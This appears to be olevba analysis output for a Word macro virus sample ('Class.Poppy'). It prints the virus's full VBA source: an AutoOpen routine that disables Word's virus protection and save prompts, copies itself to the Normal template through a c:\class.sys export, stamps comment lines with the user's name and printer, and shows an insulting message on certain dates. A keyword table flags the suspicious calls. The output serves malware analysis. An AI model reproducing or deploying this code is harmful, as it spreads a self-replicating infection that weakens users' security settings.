olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-8edad983d8ac251b192f1cf9a7a5b55137880360
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-8edad983d8ac251b192f1cf9a7a5b55137880360 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
On Error GoTo out
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
Options.VirusProtection = False
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
Options.SaveNormalPrompt = False
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
Options.ConfirmConversions = False
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
If nt > 70 And ad > 0 Then GoTo out
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
If nt < 70 Then
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
End If
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
host.codemodule.AddFromFile ("c:\class.sys")
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
With host.codemodule
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    For x = 1 To 4
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    .deletelines 1
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    Next x
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
End With
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
If nt < 70 Then
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    With host.codemodule
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    .replaceline 1, "Sub AutoClose()"
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    .replaceline 71, "Sub ToolsMacro()"
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    End With
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
End If
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
With host.codemodule
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    For x = 2 To 72 Step 2
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
    Next x
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
End With
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
out:
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
End Sub
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
Sub ViewVBCode()
'Monika Vrzalová9.2.1999 13:23:07Star XB24-200 on LPT2:dokument8Svorka
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

